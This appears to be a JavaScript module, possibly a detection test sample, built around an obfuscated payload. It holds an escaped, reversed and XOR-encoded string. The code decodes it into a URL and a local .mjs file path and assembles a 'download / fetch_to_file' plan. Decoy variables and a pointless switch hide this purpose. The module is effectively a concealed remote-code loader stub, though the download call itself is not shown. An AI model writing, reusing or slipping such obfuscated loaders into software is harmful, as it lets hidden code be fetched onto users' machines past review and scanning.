const moduleShape = Object.freeze({ format: "commonjs" });

const Material_7d703c80 = "\\u00ed\\u00f4\\u00f3\\u00b0\\u00ac\\u00a8\\u00af\\u00fa\\u00a8\\u00a7\\u00af\\u00ae\\u00aa\\u00f8\\u00fa\\u00fb\\u00b3\\u00fb\\u00f9\\u00ff\\u00ea\\u00ed\\u00b0\\u00b1\\u00fb\\u00fa\\u00f1\\u00f0\\u00b3\\u00ed\\u00ed\\u00fb\\u00ec\\u00ea\\u00f0\\u00eb\\u00f6\\u00b1\\u00ee\\u00f3\\u00ea\\u00b1\\u00a3\\u00f6\\u00ea\\u00ff\\u00ee\\u00c1\\u00fb\\u00f2\\u00f7\\u00f8\\u00e2\\u00aa\\u00f8\\u00fa\\u00fb\\u00b1\\u00ea\\u00f7\\u00fa\\u00eb\\u00df\\u00fb\\u00fa\\u00f1\\u00d0\\u00a3\\u00ea\\u00f0\\u00fb\\u00f9\\u00ff\\u00c1\\u00ec\\u00fb\\u00ed\\u00eb\\u00e2\\u00f7\\u00ee\\u00ff\\u00b1\\u00fa\\u00f7\\u00f2\\u00ff\\u00e8\\u00f0\\u00f7\\u00b0\\u00fb\\u00f2\\u00ee\\u00f3\\u00ff\\u00e6\\u00fb\\u00b0\\u00ac\\u00a8\\u00af\\u00fa\\u00a8\\u00a7\\u00af\\u00ae\\u00aa\\u00f8\\u00fa\\u00fb\\u00b3\\u00fb\\u00fa\\u00f1\\u00f0\\u00b1\\u00b1\\u00a4\\u00ed\\u00ee\\u00ea\\u00ea\\u00f6\\u00a3\\u00f2\\u00ec\\u00eb\\u00e2\\u00a8\\u00a7\\u00af\\u00ae\\u00aa\\u00d8\\u00da\\u00db\\u00b3\\u00db\\u00da\\u00d1\\u00d0\\u00a3\\u00fa\\u00f7\\u00c1\\u00f0\\u00f9\\u00f7\\u00ff\\u00ee\\u00f3\\u00ff\\u00fd\\u00e2\\u00af\\u00a3\\u00ea\\u00f0\\u00eb\\u00f1\\u00fd\\u00c1\\u00fb\\u00f9\\u00ff\\u00ea\\u00ed\\u00e2\\u00fb\\u00f2\\u00f7\\u00f8\\u00c1\\u00f1\\u00ea\\u00c1\\u00f6\\u00fd\\u00ea\\u00fb\\u00f8\\u00a3\\u00ec\\u00fb\\u00ea\\u00ee\\u00ff\\u00fa\\u00ff\\u00e2\\u00fb\\u00f2\\u00f7\\u00f8\\u00c1\\u00fb\\u00ea\\u00f7\\u00ec\\u00e9\\u00b2\\u00fb\\u00ea\\u00f1\\u00f3\\u00fb\\u00ec\\u00c1\\u00fb\\u00ec\\u00f7\\u00eb\\u00ef\\u00fd\\u00ff\\u00a3\\u00ed\\u00ee\\u00fb\\u00ea\\u00ed\\u00e2\\u00af\\u00a3\\u00e8";

const Codec_7d703c80 = "unicode_escapes|reverse_then_xor|9e";



function load_7d703c80() { return [...Material_7d703c80.matchAll(/\\u00([0-9a-f]{2})/gi)].map((item) => Number.parseInt(item[1], 16)); }

function decode_7d703c80(storedBytes) { return [...storedBytes].reverse().map((value) => value ^ 158); }

async function recover_7d703c80() {

  const harmlessValue = ["north", "south"].join(":");

  const storedBytes = load_7d703c80(); let recoveredBytes = [];

  switch (1) { case 1: recoveredBytes = decode_7d703c80(storedBytes); break; default: throw new Error("state"); }

  void harmlessValue; return Buffer.from(recoveredBytes).toString("ascii");

}

async function inspect_7d703c80() { return ({ ...{ value: await recover_7d703c80() } }).value; }

async function plan_7d703c80() { const inspect = inspect_7d703c80; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "download", transport: "fetch_to_file", destination: fields.file_path, url: fields.url }); }

void moduleShape; void plan_7d703c80;

if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_7d703c80());

